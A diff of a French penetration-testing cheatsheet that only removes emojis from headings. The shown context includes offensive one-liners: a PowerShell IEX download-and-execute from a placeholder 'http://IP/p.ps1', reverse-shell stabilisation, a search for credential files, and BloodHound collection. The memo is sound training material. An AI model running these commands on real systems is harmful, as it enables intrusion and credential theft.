@@ -1,8 +1,8 @@
-# ⚡ Cheatsheets
+# Cheatsheets
 
 > [!info] **Le mémo de toutes les commandes** — à retrouver vite quand on est en plein pentest.
 > Chaque section renvoie vers la note complète.
-> 📚 Pour le **détail d'une attaque** (schéma, étapes, détection) : [[Bibliothèque technique|🗂️ Bibliothèque de Techniques]]
+> Pour le **détail d'une attaque** (schéma, étapes, détection) : [[Bibliothèque technique| Bibliothèque de Techniques]]
 
 ---
 
@@ -1053,7 +1053,7 @@ bloodhound-python -u user -p 'pass' -d corp.local -ns 10.10.10.10 -c All --zip
 
 ## 21. Tips express (le résumé des résumés)
 
-> [!tip] 🎯 **Les réflexes "2 secondes" qui sauvent**
+> [!tip] **Les réflexes "2 secondes" qui sauvent**
 > ```bash
 > # Qu'est-ce qui tourne ? (que je n'ai pas encore vu)
 > ss -tlnp / netstat -ano
@@ -1065,7 +1065,7 @@ bloodhound-python -u user -p 'pass' -d corp.local -ns 10.10.10.10 -c All --zip
 > id; groups; net user; net localgroup Administrators
 > ```
 
-> [!tip] ⚡ **Les one-liners à retenir par cœur**
+> [!tip] **Les one-liners à retenir par cœur**
 > ```bash
 > # Reverse shell stabilisé (python)
 > python3 -c 'import pty,socket,os;pty.spawn("/bin/bash")'
@@ -1081,17 +1081,17 @@ bloodhound-python -u user -p 'pass' -d corp.local -ns 10.10.10.10 -c All --zip
 > IEX(New-Object Net.WebClient).DownloadString('http://IP/p.ps1')
 > ```
 
-> [!tip] 🧊 **Quand TOUT semble bloqué**
+> [!tip] **Quand TOUT semble bloqué**
 > - Refaire l'énumération **complète** avec un oeil neuf (souvent un port oublié).
 > - **sortir de la boîte** : vers un protocole non testé (SMTP, MSSQL, Redis, NFS).
 > - Regarder les **services en localhost** (port 8080/3000/9200 internes).
 > - Chercher des **creds dans des fichiers** (log, backup, historique).
 > - Vérifier si un **autre compte** peut être la cible (spray discret).
 
-> [!tip] 🔄 **Workflow d'un pentest**
+> [!tip] **Workflow d'un pentest**
 > 1. Scan → 2. Enum → 3. Identification des vecteurs → 4. Exploitation → 5. Privesc → 6. Post-exploitation → 7. Rapport
 
-> [!tip] 🧰 **Outils indispensables dans la trousse**
+> [!tip] **Outils indispensables dans la trousse**
 > - Enum : `nmap`, `ffuf`, `gobuster`, `nikto`, `enum4linux`
 > - Exploit : `metasploit`, `sqlmap`, `nuclei`
 > - AD : `bloodhound-python`, `impacket`, `crackmapexec`, `evil-winrm`
@@ -1103,14 +1103,14 @@ bloodhound-python -u user -p 'pass' -d corp.local -ns 10.10.10.10 -c All --zip
 
 ## 22. Checklist "je suis bloqué"
 
-> [!success] 🏆 **La mini-checklist "je suis bloqué"**
+> [!success] **La mini-checklist "je suis bloqué"**
 > 1. J'ai bien fait l'énumération **complète** ? (ports -p-, tous les services)
 > 2. J'ai testé le **même service sur les 2 protocoles** ? (smb + ldap + kerberos)
 > 3. J'ai regardé **BloodHound / linpeas / winpeas** ?
 > 4. J'ai testé les **credentials trouvés ailleurs** (réutilisation) ?
 > 5. J'ai cherché les **CVE** de la version exacte (searchsploit) ?
 
-> [!success] 🔍 **Étapes de dépannage**
+> [!success] **Étapes de dépannage**
 > 1. **Revérifier** l'énumération : `nmap -sV -sC -p- --min-rate 5000`
 > 2. **Chercher des credentials** : `find / -name "*.conf" -o -name "*.bak" -o -name ".env" 2>/dev/null`
 > 3. **Vérifier les anciens exploits** : `searchsploit <service> <version>`
@@ -1120,10 +1120,10 @@ bloodhound-python -u user -p 'pass' -d corp.local -ns 10.10.10.10 -c All --zip
 > 7. **Regarder les conteneurs/Docker** pour escalade
 > 8. **Tester des protocoles alternatifs** : SNMP, SMTP, NFS, Redis, MySQL, MSSQL
 
-> [!success] 📋 **Après exploitation — ne pas oublier**
+> [!success] **Après exploitation — ne pas oublier**
 > 1. Documenter **chaque étape** avec preuve (screenshot + commande)
 > 2. Noter les **credentials** et **hashes** obtenus
 > 3. Vérifier si le même password est utilisé **ailleurs**
 > 4. Sauvegarder les **fichiers sensibles** trouvés
 > 5. **Nettoyer** les artefacts d'exploitation si demandé dans le scope
-> 6. **Prochaine note** : [[12 - Ressources & Lab|🎓 Ressources & Lab]]
+> 6. **Prochaine note** : [[12 - Ressources & Lab| Ressources & Lab]]
